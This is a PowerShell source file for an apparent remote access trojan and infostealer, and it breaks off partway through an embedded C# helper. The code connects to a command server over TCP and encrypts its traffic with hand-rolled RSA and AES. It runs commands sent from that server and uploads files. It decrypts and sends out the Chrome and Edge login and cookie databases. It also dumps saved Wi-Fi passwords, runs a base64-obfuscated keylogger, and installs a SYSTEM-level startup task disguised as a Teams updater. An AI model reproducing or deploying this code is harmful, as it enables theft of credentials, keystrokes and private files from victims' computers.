function pow-mod($x, $y, $z)
{
	$n = [System.Numerics.BigInteger]1
	$x = [System.Numerics.BigInteger]$x
	$y = [System.Numerics.BigInteger]$y
	$z = [System.Numerics.BigInteger]$z
	while ($y -gt 0)
	{
		if (-not ($y % 2 -eq 0))
		{
			$n = $n * $x % $z
		}
		$y = $y -shr 1
		$x = $x * $x % $z
	}
	return $n
}



function power($x, $y)
{
	$n = [System.Numerics.BigInteger]::Parse("1")
	for ($i = 0; $i -lt $y; $i++)
	{
		$n = $n * $x
	}
	return $n
}


function is-prime($n)
{
	
	$primes = (2, 3, 5)
	if ($n -eq 0)
	{
		return $false
	}
	if ($n -eq 1)
	{
		return $false
	}
	if ($primes.Contains($n))
	{
		$true
	}
	if ($n -lt 5)
	{
		return $false
	}
	
	if ($n % ($n -shr 1) -eq 0)
	{
		return $false
	}
	for ($i = 2; $i -lt ([Math]::SQRT($n) + 1); $i++)
	{
		if ($n % $i -eq 0)
		{
			return $false
		}
	}
	return $true
	
}



function div2($n)
{
	$e = $n - 1
	$m = 0
	while ($e % 2 -eq 0)
	{
		$e = $e -shr 1
		$m = $m + 1
	}
	return $e, $m
	
}



function iterat($a, $e, $m, $n)
{
	$a = [System.Numerics.BigInteger]$a
	$e = [System.Numerics.BigInteger]$e
	$m = [System.Numerics.BigInteger]$m
	$n = [System.Numerics.BigInteger]$n
	if ((pow-mod -x $a -y $e -z $n) -eq 1)
	{
		return $true
	}
	for ($i = 0; $i -lt $m; $i++)
	{
		$y = (power -x 2 -y $i) * $e
		$t = pow-mod -x $a -y $y -z $n
		if ($t -eq $n - 1)
		{
			return $true
		}
	}
	return $false
	
}



function miler-rabin($n)
{
	$em = (div2 -n $n)
	$e = [System.Numerics.BigInteger]$em[0]
	$m = [System.Numerics.BigInteger]$em[1]
	$n = [System.Numerics.BigInteger]$n
	for ($i = 0; $i -lt 20; $i++)
	{
		$a = GetRandomRange -min 2 -max $n
		if (-not (iterat -a $a -e $e -m $m -n $n))
		{
			return $false
		}
	}
	return $true
}




function get-prime2($nbit)
{
	$primes = @(2)
	for ($i = 3; $i -lt 1000; $i++)
	{
		if (is-prime -n $i)
		{
			$primes += $i
		}
	}
	while ($true)
	{
		$p = (random-bit -nbi $nbit)
		$p = [System.Numerics.BigInteger]$p
		$c = 0
		foreach ($t in $primes)
		{
			$t = [System.Numerics.BigInteger]$t
			if ($p % $t -eq [System.Numerics.BigInteger]0)
			{
				$c = 1
				break
			}
		}
		if ($c -eq 0)
		{
			$prime = (miler-rabin -n $p)
			if ($prime)
			{
				return $p
			}
		}
	}
}

function GetRandomRange($min, $max)
{
	$min = [System.Numerics.BigInteger]::Parse($min)
	$max = [System.Numerics.BigInteger]::Parse($max)
	$r = [System.Numerics.BigInteger]::Parse(([System.Numerics.BigInteger](Get-Random -Minimum $min -Maximum $max)))
	return $r
}

function random-bit($nbi)
{
	$min = [System.Numerics.BigInteger]$nbi - 1
	$max = [System.Numerics.BigInteger]$nbi
	$r = GetRandomRange -min ((power -x 2 -y $min) + 1) -max ((power -x 2 -y $max) - 1)
	return [System.Numerics.BigInteger]::Add($r, 1)
}


class Euclids
{
	[System.Numerics.BigInteger]gcd ($a, $b)
	{
		$r = [System.Numerics.BigInteger]0
		while ($true)
		{
			if ($a -eq 0 -or $b -eq 0)
			{
				break
			}
			$na = $a
			$nb = $b
			$a = $na % $nb
			$b = $nb % $na
			$r = $b + $a
		}
		return $r
	}
	
	[array]gcdx ($a, $b)
	{
		#$r=[System.Numerics.BigInteger]0
		if ($a -eq 0)
		{
			return $b, 0, 1
		}
		$r = [System.Numerics.BigInteger]$b % $a
		$g = [Euclids]::new().gcdx($r, $a)
		$r = [System.Numerics.BigInteger]$g[0]
		$x1 = [System.Numerics.BigInteger]$g[1]
		$y1 = [System.Numerics.BigInteger]$g[2]
		$x = [System.Numerics.BigInteger]$y1 - ([System.Numerics.BigInteger]::Divide($b, $a)) * $x1
		$y = [System.Numerics.BigInteger]$x1
		return $r, $x, $y
	}
}


class BitConvert
{
	hidden [System.Numerics.BigInteger]div256($n)
	{
		while (($n -gt 256) -or ($n -eq 256))
		{
			$n = [System.Numerics.BigInteger]$n/256
		}
		return [System.Numerics.BigInteger]$n
	}
	
	[System.Numerics.BigInteger]getBitLen([System.Numerics.BigInteger]$n)
	{
		$c = 1
		while (($n -gt 256) -or ($n -eq 256))
		{
			$n = [System.Numerics.BigInteger]::Divide($n, 256)
			$c += 1
		}
		return $c
	}
	
	[array]intToByete($n, $len)
	{
		$b = @()
		for ($i = 0; $i -lt $len; $i++)
		{
			$b += ($n % 256)
			$n = [System.Numerics.BigInteger]::Divide($n, 256)
		}
		[System.Array]::Reverse($b)
		return $b
	}
	
	[System.Numerics.BigInteger]bytesToInt($bytesarray)
	{
		$c = $bytesarray.Length
		$c = [System.Numerics.BigInteger]$c - 1
		$n = 0
		for ($i = 0; -not ($i -gt $c); $i++)
		{
			$m = power -x 256 -y ($c - $i)
			$r = [System.Numerics.BigInteger]::Multiply($m, [System.Numerics.BigInteger]$bytesarray[$i])
			$n = [System.Numerics.BigInteger]::Add($r, $n)
		}
		return [System.Numerics.BigInteger]$n
	}
}


class RSA
{
	[array]genPrivateKey($nbit)
	{
		$e = [System.Numerics.BigInteger] 65537
		$p = get-prime2 -nbit $nbit
		$q = get-prime2 -nbit $nbit
		$n = [System.Numerics.BigInteger]$q * $p
		$phi = [System.Numerics.BigInteger]($p - 1) * ($q - 1)
		$x = [Euclids]::new().gcdx($e, $phi)[1]
		$d = [System.Numerics.BigInteger]$phi + $x
		$public = @($e, $n)
		$private = @($e, $p, $q, $n, $d)
		return @($public, $private)
	}
	
	[System.Numerics.BigInteger]encrypt($public, $m)
	{
		$e = [System.Numerics.BigInteger]$public[0]
		$n = [System.Numerics.BigInteger]$public[1]
		$enc = pow-mod -x $m -y $e -z $n
		return $enc
	}
	[System.Numerics.BigInteger]decrypt($private, $m)
	{
		$d = $private[-1]
		$n = $private[-2]
		$dec = pow-mod -x $m -y $d -z $n
		return $dec
	}
	[array]encryptData($public, $data)
	{
		$con = [BitConvert]::new()
		$m = $con.bytesToInt($data)
		$enc = [RSA]::new().encrypt($public, $m)
		$bitlen = $con.getBitLen($enc)
		return $con.intToByete($enc, $bitlen)
	}
	[array]decryptData($private, $data)
	{
		$con = [BitConvert]::new()
		$m = $con.bytesToInt($data)
		$dec = [RSA]::new().decrypt($private, $m)
		$bitlen = $con.getBitLen($dec)
		return $con.intToByete($dec, $bitlen)
	}
	
	[string]signature($private, $message)
	{
		$d = $private[2]
		$n = $private[3]
		$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
		$hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
		$hash = bytes-toInt($hash)
		$s = pow-mod -x $hash -y $d -z $n
		$s = intToByetes -n $s -len 32
		return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
	}
	
	
	[string]verifySignature($public, $signature, $message)
	{
		$e = [System.Numerics.BigInteger]$public[0]
		$n = [System.Numerics.BigInteger]$public[1]
		$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('sha256')
		$hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($message))
		$hash = bytes-toInt($hash)
		$m = bytes-toInt($message)
		if ((pow-mod -x $m -y $e -z $n) -eq $hash)
		{
			return $true
		}
		return $false
	}
	
}


class AEScrypto
{
	
	[object]$aesManaged
	[object]$encryptor
	[object]$decryptor
	[object]$chipher
	[array]$key
	[array]$iv
	
	AEScrypto([array]$key, [array]$iv)
	{
		$this.aesManaged = New-Object "System.Security.Cryptography.AesManaged"
		$this.aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
		$this.aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::pkcs7
		$this.aesManaged.Key = $key
		$this.aesManaged.IV = $iv
		$this.encryptor = $this.aesManaged.CreateEncryptor()
		$this.decryptor = $this.aesManaged.CreateDecryptor()
		
	}
	
	[array]randomIV($oldIV)
	{
		return [System.Security.Cryptography.MD5]::Create().ComputeHash($oldIV)
	}
	
	[array]encrypt($data)
	{
		return $this.encryptor.TransformFinalBlock($data, 0, $data.Length)
	}
	
	[array]decrypt($data)
	{
		return $this.decryptor.TransformFinalBlock($data, 0, $data.Length)
	}
}


class Client
{
	[string]$ip
	[int]$port
	client([string]$ip, [int]$port)
	{
		$this.ip = $ip
		$this.port = $port
	}
	
	hidden [object]connect()
	{
		
		[object]$sock = New-Object System.Net.Sockets.TcpClient
		$sock.Connect($this.ip, $this.port)
		$sock.Client.SendTimeout = -1
		$sock.Client.ReceiveTimeout = -1
		[object]$stream = $sock.GetStream()
		return $stream
	}
	
	[bool]sync($stream)
	{
		$buffer = New-Object System.Byte[] 1
		$stream.Read($buffer, 0, 1)
		if ($buffer -like 114)
		{
			return $true
		}
		return $false
	}
	
	[array]readmsg($stream)
	{
		$buffer = New-Object System.Byte[] 4
		$stream.Read($buffer, 0, 4)
		$header = [BitConverter]::ToInt32($buffer, 0)
		$buffer = New-Object System.Byte[] $header
		$stream.Read($buffer, 0, $header)
		$stream.Write([byte[]]114, 0, 1)
		return $buffer
	}
	
	[void]handle($stream)
	{
		$stream.send([byte[]]1)
		Start-Sleep -Seconds 4
	}
	
	[bool]send($content, $stream)
	{
		$header = [BitConverter]::GetBytes($content.Length)
		$content = $header + $content
		$stream.Write($content, 0, $content.Length)
		return $this.sync($stream)
	}
	
	[array]sendKey($stream, $public)
	{
		$rsa = [RSA]::new()
		$key = @()
		for ($i = 0; $i -lt 64; $i++)
		{
			$key += (Get-Random -Minimum 0 -Maximum 255)
		}
		while ($true)
		{
			if ((($this.readmsg($stream)).Length) -gt 2)
			{
				break
			}
		}
		$key = [System.Security.Cryptography.SHA256]::Create().ComputeHash($key)
		$iv = [System.Security.Cryptography.MD5]::Create().ComputeHash($key)
		$tosend = $rsa.encryptData($public, $key)
		$this.send($tosend, $stream)
		return @($key, $iv)
	}
	
}


function GetFile-Bytes($FilePath)
{
	try
	{
		return ([System.IO.File]::ReadAllBytes($FilePath))
	}
	catch
	{
		$file = New-Object System.IO.FileStream($FilePath, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
		$content = New-Object byte[] $file.Length
		$___ = $file.Read($content, 0, $file.Length)
		$___ = $file.Close()
		return $content
	}
}

function Start-UserTask($name, $user, $process, $argument)
{
	if ((schtasks /query /tn $name 2>$null) -ne $null)
	{
		schtasks /delete /tn $name /f > $null 2>&1
	}
	$action = New-ScheduledTaskAction -Execute $process -Argument $argument
	$Principal = New-ScheduledTaskPrincipal -UserId $user -LogonType Interactive
	$settings = New-ScheduledTaskSettingsSet
	$settings.DisallowStartIfOnBatteries = $false
	Register-ScheduledTask $name -Principal $Principal -Action $action -Settings $settings
	Start-ScheduledTask $name
	do
	{
		$res = (schtasks /query /tn $name /v /fo CSV | ConvertFrom-Csv)
		Start-Sleep -Seconds 0.5
	}
	until ($res.'Last Result' -eq 0)
	schtasks /delete /tn $name /f > $null 2>&1
}


class WebGather{
	
	[Object]$pathes
	[string]$homepath
	
	WebGather()
	{
		$this.homepath = Get-HomeProfile
		$this.pathes = @{
			'chrome'		 = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
			'edge'		     = "$($this.homepath)\AppData\Local\Microsoft\Edge\User Data"
			'chrome cookies' = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
			'edge cookies'   = "$($this.homepath)\AppData\Local\Google\Chrome\User Data"
		}
	}
	
	[array]GCMkey($WEB)
	{
		$path = $this.pathes.$WEB
		$content = Get-Content -Path "$path\Local State" -Raw | ConvertFrom-Json
		$GCKEY = $content.os_crypt.encrypted_key
		$argument = @"
        `$GCKEY=[System.Convert]::FromBase64String('$GCKEY');
                Add-Type -AssemblyName System.Security;
                `$comm='[System.Security.Cryptography.ProtectedData]::Unprotect(
                    `$GCKEY[5 .. (`$GCKEY.length-1)], 
                    `$null, 
                    [System.Security.Cryptography.DataProtectionScope]::LocalMachine)';
                `$out=(Invoke-Expression -Command `$comm);
                Set-ItemProperty -Path HKCU:\Environment -Name 'WINUPDATE' -Value `$out -Type Binary;
                start-sleep -Second 5
"@
		RunPow-AsCurrentUser -command $argument
		$GCMKEY = $false
		$username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1]
		$UID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid
		while (-not ($GCMKEY))
		{
			try
			{
				if (-not (Get-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment").WINUPDATE)
				{
					continue
				}
				$GCMKEY = Invoke-Expression '(Get-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name "WINUPDATE").WINUPDATE'
				$buffer = New-Object System.Byte[] ($GCMKEY.Length)
				Set-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name 'WINUPDATE' -Value $buffer -Type Binary
				Remove-ItemProperty -Path "registry::HKEY_USERS\$UID\Environment" -Name "WINUPDATE"
				break
			}
			catch
			{
				{ }
				Start-Sleep 0.5
			}
		}
		return $GCMKEY
	}
	
	[Object]SendDataBase($WEB, $client, $key, $iv, $stream)
	{
		$path = $this.pathes.$WEB
		$profiles = (Get-ChildItem -Path $path -Directory | Where { ($_.FullName -like "*Profile*" -or $_.FullName -like "*Default*") -and ($_.FullName -notlike "*System Profile*") }).FullName
		if ($WEB.Contains('cookies'))
		{
			$f = "Network\Cookies"
		}
		else { $f = 'Login Data' }
		$___ = $client.send([AEScrypto]::new($key, $iv).encrypt($this.GCMkey($WEB)), $stream)
		foreach ($i in $profiles)
		{
			$p = [AEScrypto]::new($key, $iv).encrypt(([System.Text.Encoding]::ASCII.GetBytes($i)))
			$d = [AEScrypto]::new($key, $iv).encrypt((GetFile-Bytes -FilePath "$i\$f"))
			$___ = $client.send($p, $stream)
			$___ = $client.send($d, $stream)
		}
		$___ = $client.send([AEScrypto]::new($key, $iv).encrypt(@(101, 110, 100, 46)), $stream)
		return [AEScrypto]::new($key, $iv)
	}
}

function Start-KeyLogger {

    return Start-Job {
        Add-Type -AssemblyName System.Windows.Forms
        $listout =  New-Object System.Collections.Generic.List[string]
        $key = [Microsoft.Win32.RegistryKey]::OpenBaseKey("CurrentUser", [Microsoft.Win32.RegistryView]::Default)
        $subkey = $key.OpenSubKey("Environment", $true)
        $subkey.SetValue("UserEnvironment", 0, [Microsoft.Win32.RegistryValueKind]::DWord)
        $signatures = 'W0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvLCBFeGFjdFNwZWxsaW5nPXRydWUpXSAKcHVibGljIHN0YXRpYyBleHRlcm4gc2hvcnQgR2V0QXN5bmNLZXlTdGF0ZShpbnQgdmlydHVhbEtleUNvZGUpOyAKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IEdldEtleWJvYXJkU3RhdGUoYnl0ZVtdIGtleXN0YXRlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IE1hcFZpcnR1YWxLZXkodWludCB1Q29kZSwgaW50IHVNYXBUeXBlKTsKW0RsbEltcG9ydCgidXNlcjMyLmRsbCIsIENoYXJTZXQ9Q2hhclNldC5BdXRvKV0KcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFRvVW5pY29kZSh1aW50IHdWaXJ0S2V5LCB1aW50IHdTY2FuQ29kZSwgYnl0ZVtdIGxwa2V5c3RhdGUsIFN5c3RlbS5UZXh0LlN0cmluZ0J1aWxkZXIgcHdzekJ1ZmYsIGludCBjY2hCdWZmLCB1aW50IHdGbGFncyk7Cg=='
        $API = Add-Type -MemberDefinition ([System.Text.Encoding]::UTF8.GetString([system.convert]::FromBase64String($signatures))) -Name 'Win32' -Namespace API -PassThru
        while ($true) {
            Start-Sleep -Milliseconds 40
            for ($virtualKey = 1; $virtualKey -le 254; $virtualKey++) {
            $state = $API::GetAsyncKeyState($virtualKey)
            if ($state -eq -32767) {
                $LeftShift    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000)   -eq 0x8000
                $RightShift   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000)   -eq 0x8000
                $LeftCtrl     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                $RightCtrl    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                $LeftAlt      = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000)       -eq 0x8000
                $RightAlt     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000)       -eq 0x8000
                $TabKey       = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000)         -eq 0x8000
                $SpaceBar     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000)       -eq 0x8000
                $DeleteKey    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000)      -eq 0x8000
                $EnterKey     = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000)      -eq 0x8000
                $BackSpaceKey = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000)        -eq 0x8000
                $LeftArrow    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000)        -eq 0x8000
                $RightArrow   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000)       -eq 0x8000
                $UpArrow      = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000)          -eq 0x8000
                $DownArrow    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000)        -eq 0x8000
                $LeftMouse    = ($API::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000)     -eq 0x8000
                $RightMouse   = ($API::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000)     -eq 0x8000
            
                if ($LeftShift -or $RightShift) {$virkey += '[Shift]'}
                if ($LeftCtrl  -or $RightCtrl)  {$virkey += '[Ctrl]'}
                if ($LeftAlt   -or $RightAlt)   {$virkey += '[Alt]'}
                if ($TabKey)       {$virkey += '[Tab]'}
                if ($SpaceBar)     {$virkey += '[SpaceBar]'}
                if ($DeleteKey)    {$virkey += '[Delete]'}
                if ($EnterKey)     {$virkey += '[Enter]'}
                if ($BackSpaceKey) {$virkey += '[Backspace]'}
                if ($LeftArrow)    {$virkey += '[Left Arrow]'}
                if ($RightArrow)   {$virkey += '[Right Arrow]'}
                if ($UpArrow)      {$virkey += '[Up Arrow]'}
                if ($DownArrow)    {$virkey += '[Down Arrow]'}
                if ($LeftMouse)    {$virkey += '[Left Mouse]'}
                if ($RightMouse)   {$virkey += '[Right Mouse]'}
                if ([Console]::CapsLock) {$virkey += '[Caps Lock]'}

                $virtualKeyc = $API::MapVirtualKey($virtualKey, 3)
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)

                $mychar = New-Object -TypeName System.Text.StringBuilder
                $success = $API::ToUnicode($virtualKey, $virtualKeyc, $kbstate, $mychar, $mychar.Capacity, 0)
                if (([System.Text.RegularExpressions.Regex]::Matches($virkey, '\[').Count) -gt 1){
                    $listout[-1] = ''
                }
                $listout.Add("$virkey$mychar")
                $virkey = ''
                if ($subkey.GetValue('UserEnvironment') -eq 12){
                    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes(($listout | ConvertTo-Json))
                    $mmf = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew("MMMFFF", $dataBytes.Length)
                    $view = $mmf.CreateViewAccessor()
                    for ($i = 0; $i -lt $dataBytes.Length; $i++) {
                        $view.Write($i, $dataBytes[$i])
                    }
                    $view.Flush()
                    $view.Dispose()
                    while ($subkey.GetValue('UserEnvironment') -ne 123){
                        Start-Sleep -Milliseconds 40
                        Write-Host 'i m here'
                    }
                    for ($i=0;$i -lt 10; $i++){
                        try{$mmf.Dispose()}catch{break}
                    }

                    $listout =  New-Object System.Collections.Generic.List[string]
                    $subkey.SetValue("UserEnvironment", 0, [Microsoft.Win32.RegistryValueKind]::DWord)
                    }
                }
            }
        }
    }
}


function Creat-NewTask($path, $argument, $Name)
{
	try
	{
		if ($Name -in (Get-ScheduledTask))
		{
			return
		}
		$Trigger = New-ScheduledTaskTrigger -AtStartup
		$SystemUser = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
		$action = New-ScheduledTaskAction -Execute $path -Argument $argume
		Register-ScheduledTask $Name -Principal $SystemUser -Action $action -Trigger $Trigger -Force
		$service = Get-Service -Name "schedule"
		$service | Restart-Service
	}
	catch
	{
		{ }
	}
}

function get-wifiPasswords
{
	$test = netsh wlan show profiles
	$profiles = @()
	foreach ($i in $test)
	{
		if ($i.contains("All User Profile"))
		{
			$profiles += $i.Split(':')[-1].Trim()
		}
	}
	$passwords = ""
	foreach ($i in $profiles)
	{
		$password = netsh wlan show profile $i key = clear
		if (([string]$password).Contains("Key Content"))
		{
			foreach ($n in $password)
			{
				if ($n.contains("Key Content"))
				{
					$keyCon = $n.split(' : ')[-1].Trim()
					$passwords += "$i     :    $keyCon`n"
				}
			}
		}
	}
	return $passwords
}

function Excmd
{
	
	param
	(
		[Parameter(Mandatory)]
		[string]$command
	)
	try
	{
		return (Invoke-Expression -Command $command | Out-String).Trim()
	}
	catch
	{
		return "=A+Z-E^R^O&R$_"
	}
	
}

function Assert-RunOnce
{
	if (-not (Test-Path "$env:TEMP\65923497834567834693845988734893.tmp"))
	{
		New-Item -Path "$env:TEMP\65923497834567834693845988734893.tmp" -ItemType "file" -Force
	}
	try
	{
		$file = [System.IO.File]::Open("$env:TEMP\65923497834567834693845988734893.tmp", [System.IO.FileMode]::Open)
		return
	}
	catch
	{
		exit
	}
}

function Get-SockStream($client)
{
	try
	{
		return $client.connect()
	}
	catch
	{
		return $false
	}
}

function Assert-Admin()
{
	if (-not (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)))
	{
		exit
	}
}


function RunPow-AsCurrentUser($command)
{
	[TsakAsother.ProcessExecution]::TaskCurrent(
		"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
		"-NoProfile -NonInteractive -ExecutionPolicy Bypass -w h -Command $command"
	)
}

function Get-HomeProfile()
{
	$username = ((Get-WmiObject -ClassName Win32_ComputerSystem).UserName).Split('\')[-1]
	$UserID = (Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.Name -eq $username }).sid
	return (Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\ProfileList\$UserID").ProfileImagePath
}

function Start-Teams()
{
	$homepath = Get-HomeProfile
	Creat-NewTask -path "$homepath\AppData\Local\Microsoft\Teams\Update.exe" -argument "--processStart Teams.exe" -Name "UpdateTeams"
}

function Start-Main
{
	$n = [System.Numerics.BigInteger]::Parse("24167402767654577565716389815235569967390138512024137497386480228714459623333728107550442019967341332053940559315871104193316625676287327705224404592395885695827727800334356656078494465334764933984362150328647642679827786023792149061377853406629987146126403665715498483598938424562357472270283226106922575054267526543955052845613720230410609968151396625485965130532490768894210017875706817812676831767822251026991167386779935369014898100686467230341800659314991606618373358316608131771884170257420378343129059831609845883841561567536343257616438711061881770390832717316958948348326818632753120572695814500526819624897")
	$e = [System.Numerics.BigInteger]::Parse("65537")
	$PUBLIC = @($e, $n)
	while ($true)
	{
		try
		{
			$client = [Client]::new($global:SERVIP, 999)
			$stream = Get-SockStream -client $client
			if ($stream -eq $false)
			{
				continue
			}
			$ciphers = $client.sendKey($stream, $PUBLIC)
			$encryptionKey = $ciphers[0]
			$iv = $ciphers[-1]
			$randomal = $ciphers[-1]
			$aes = [AEScrypto]::new($encryptionKey, $iv)
			while ($true)
			{
				$randTheIv = $true
				$message = ($client.readmsg($stream))
				$reader = [System.Text.Encoding]::ASCII.GetString($aes.decrypt($message))
				if ($reader -like "steale password*")
				{
					$WEB = ($reader -split "password")[-1].Trim()
					$aes = [WebGather]::new().SendDataBase($WEB, $client, $encryptionKey, $randomal, $stream)
					$randTheIv = $false
				}
				elseif ($reader.StartsWith("GetFileBytes -pin"))
				{
					$path = (($reader -split "GetFileBytes -pin")[-1]).Trim()
					if (Test-Path -Path $path)
					{
						$___ = $client.send($aes.encrypt((GetFile-Bytes -FilePath $path)), $stream)
					}
					else
					{
						$___ = $client.send(
							$aes.encrypt(@(70, 105, 108, 101, 32, 100, 111, 101, 115, 110, 39, 116, 32, 101, 120, 105, 115, 116)),
							$stream
						)
					}
				}
				else
				{
					$out = $aes.encrypt([System.Text.Encoding]::ASCII.GetBytes((Excmd -command ($reader))))
					$___ = $client.send($out, $stream)
				}
				if ($randTheIv)
				{
					$randomal = ([System.Security.Cryptography.MD5]::Create().ComputeHash($randomal))[0 .. 32]
					$aes = [AEScrypto]::new($encryptionKey, $randomal)
				}
			}
		}
		catch
		{
			Start-Sleep -Seconds 2
		}
	}
}


$Source = @"
using System;  
using System.Runtime.InteropServices;

namespace TsakAsother  
{
    public static class ProcessExecution
    {
        #region Win32 Constants
        private const int CREATE_UNICODE_ENVIRONMENT = 0x00000400;
        private const int CREATE_NO_WINDOW = 0x08000000;
        private const int CREATE_NEW_CONSOLE = 0x00000010;
        private const uint INVALID_SESSION_ID = 0xFFFFFFFF;
        private static readonly IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;
        #endregion
        #region DllImports
        [DllImport("advapi32.dll", EntryPoint = "CreateProcessAsUser", SetLastError = true, CharSet = CharSet.Ansi, CallingConvention = CallingConvention.StdCall)]
        private static extern bool CreateProcessAsUser(
            IntPtr hToken,
            String lpApplicationName,
            String lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandle,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", EntryPoint = "DuplicateTokenEx")]
        private static extern bool DuplicateTokenEx(
            IntPtr ExistingTokenHandle,
            uint dwDesiredAccess,
            IntPtr lpThreadAttributes,
            int TokenType,
            int ImpersonationLevel,
            ref IntPtr DuplicateTokenHandle);

        [DllImport("userenv.dll", SetLastError = true)]
        private static extern bool CreateEnvironmentBlock(ref IntPtr lpEnvironment, IntPtr hToken, bool bInherit);

        [DllImport("userenv.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hSnapshot);

        [DllImport("kernel32.dll")]
        private static extern uint WTSGetActiveConsoleSessionId();

        [DllImport("Wtsapi32.dll")]
        private static extern uint WTSQueryUserToken(uint SessionId, ref IntPtr phToken);

        [DllImport("wtsapi32.dll", SetLastError = true)]
        private static extern int WTSEnumerateSessions(
            IntPtr hServer,
            int Reserved,
            int Version,
            ref IntPtr ppSessionInfo,
            ref int pCount);

        #endregion

        #region Win32 Structs

        private enum SW
        {
            SW_HIDE = 0,
            SW_SHOWNORMAL = 1,
            SW_NORMAL = 1,
            SW_SHOWMINIMIZED = 2,
            SW_SHOWMAXIMIZED = 3,
            SW_MAXIMIZE = 3,
            SW_SHOWNOACTIVATE = 4,
            SW_SHOW = 5,
            SW_MINIMIZE = 6,
            SW_SHOWMINNOACTIVE = 7,
            SW_SHOWNA = 8,
            SW_RESTORE = 9,
            SW_SHOWDEFAULT = 10,
            SW_MAX = 10
        }

        private enum WTS_CONNECTSTATE_CLASS
        {
            WTSActive,
            WTSConnected,
            WTSConnectQuery,
            WTSShadow,
            WTSDisconnected,
            WTSIdle,
            WTSListen,
            WTSReset,
            WTSDown,
            WTSInit
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        private enum SECURITY_IMPERSONATION_LEVEL
        {
            SecurityAnonymous = 0,
            SecurityIdentification = 1,
            SecurityImpersonation = 2,
            SecurityDelegation = 3,
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public String lpReserved;
            public String lpDesktop;
            public String lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        private enum TOKEN_TYPE
        {
            TokenPrimary = 1,
            TokenImpersonation = 2
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct WTS_SESSION_INFO
        {
            public readonly UInt32 SessionID;

            [MarshalAs(UnmanagedType.LPStr)]
            public readonly String pWinStationName;

            public readonly WTS_CONNECTSTATE_CLASS State;
        }

        #endregion
        private static bool GetSessionUserToken(ref IntPtr phUserToken)
        {
            var bResult = false;
            var hImpersonationToken = IntPtr.Zero;
            var activeSessionId = INVALID_SESSION_ID;
            var pSessionInfo = IntPtr.Zero;
            var sessionCount = 0;

